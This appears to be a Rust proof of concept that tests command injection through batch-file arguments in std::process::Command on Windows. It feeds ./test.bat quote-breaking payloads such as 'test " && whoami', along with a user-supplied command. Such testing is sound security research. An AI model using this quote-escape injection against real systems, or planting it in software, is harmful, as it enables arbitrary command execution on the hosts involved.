use std::process::Command;
use std::io;

fn main() {
    // Vector to store payloads
    let mut payloads = vec![
        "test",
        r#"test && whoami"#,
        r#"test " && whoami"#,
    ];

    // Ask user for input and add it to the payloads vector
    println!("Enter payload:");
    let mut input = String::new();
    io::stdin().read_line(&mut input).expect("Failed to read line");
    let payload = input.trim(); // Trim whitespace and newline characters
let command = format!(r#"test " && {}"#, payload);
    payloads.push(&command);

    // Iterate over each payload and execute it
    println!("Command Injection on Command::arg");
    for payload in &payloads {
        let output = Command::new("./test.bat")
            .arg(payload)
            .output()
            .expect("Failed to execute command");
        println!(
            "Output for payload '{}':\n{}",
            payload,
            String::from_utf8_lossy(&output.stdout)
        );
    }

    println!("====================================");

    println!("Command Injection on Command::args");
    for payload in &payloads {
        let output = Command::new("./test.bat")
            .args(&[payload])
            .output()
            .expect("Failed to execute command");
        println!(
            "Output for payload '{}':\n{}",
            payload,
            String::from_utf8_lossy(&output.stdout)
        );
    }
}
